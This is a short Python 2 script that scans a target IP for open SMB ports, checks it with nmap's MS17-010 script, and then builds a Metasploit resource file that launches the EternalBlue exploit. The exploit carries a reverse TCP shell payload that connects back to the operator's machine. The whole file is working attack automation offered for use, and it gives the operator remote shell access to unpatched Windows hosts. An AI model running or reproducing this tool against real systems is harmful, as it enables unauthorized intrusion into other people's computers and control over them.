#!/usr/bin/python
import socket;
import nmap;
import os;
import sys;

IP = raw_input("\nEnter the IP address:");
ports = [139, 445]

nm = nmap.PortScanner()

def scan(host, port):
	try:
		connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
		connection.connect((host, port))
		return True
	except:
		return False

for port in ports[:]:
	if scan(IP, port):
		print "Port", port, "is open"
	else:
		print "Port", port, "is closed"

print "\n-------------------------------------------------------------------"
check = raw_input("Verify whether the system is vulnerable to EternalBlue exploit(Y/N):");

if check == 'Y' or check == 'y':
	try:
		print "-------------------------------------------------------------------"
		output = nm.scan(hosts=IP, arguments='-p445 --script smb-vuln-ms17-010')
		print nm[IP]['hostscript'][0]['output']
	except:
		print "The system is not vulnerable to EternalBlue exploit"
		exit()
else:
	exit()
exploit = raw_input("\nProceed to exploit the system(Y/N):");

if exploit == 'Y' or exploit == 'y':
	try:
		RHOST = "set RHOST"+" "+IP
		LocalIP = raw_input("Enter the IP address of the local system:");
		LHOST = "set LHOST"+" "+LocalIP
		commands = ["use exploit/windows/smb/ms17_010_eternalblue", "set PAYLOAD windows/x64/shell/reverse_tcp", "set RPORT 445", "set LPORT 4444", "exploit"]


		dirpath = os.getcwd()
		filecheck = os.path.isfile(dirpath+"/"+"metasploit.rc")
		if filecheck == True:
	        	try:
	                	os.remove(dirpath+"/"+"metasploit.rc")
	                	file = open(dirpath+"/"+"metasploit.rc","w")
	        	except:
	                	print "File not found:metasploit.rc"
		elif filecheck == False:
	        	file = open(dirpath+"/"+"metasploit.rc","w")
		file.write(RHOST)
		file.write("\n")
		file.write(LHOST)
		file.write("\n")
		for line in commands:
	        	file.write(line)
	        	file.write("\n")
		file.close()
	
		print "Exploitation started.......\n"
		session = os.system("msfconsole -q -r metasploit.rc")

	except Exception as e: 
		print(e)
		exit()
else:
	exit()

